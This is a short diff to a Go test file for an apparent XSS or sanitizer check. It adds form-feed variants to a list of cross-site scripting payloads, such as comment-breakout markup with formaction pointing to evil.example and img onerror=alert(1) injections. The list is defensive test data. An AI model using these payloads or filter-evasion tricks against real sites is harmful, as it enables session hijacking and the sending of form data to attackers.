@@ -684,6 +684,9 @@ var xssInertMarkupPositives = []string{
 	"<!--><form action=//evil.example/><button>x</button>`-->",
 	"<!--x`--><form><button formaction=//evil.example>x",
 	"<!--`--><button form=f formaction=//evil.example>x",
+	// A form feed before the '=' is a blank to an HTML tokenizer.
+	"<!--><button formaction\f=//evil.example>x`-->",
+	"<!--><input type=submit formaction\f=//evil.example>`-->",
 	"<!-- <!-- `x` --> <img src=x onerror=alert(1)> -->",
 	"<!--x`--><img src=x onerror&#x3d;alert(1)>",
 	"<svg><![CDATA[<!--]]><img src=x onerror=alert(1)>`-->",
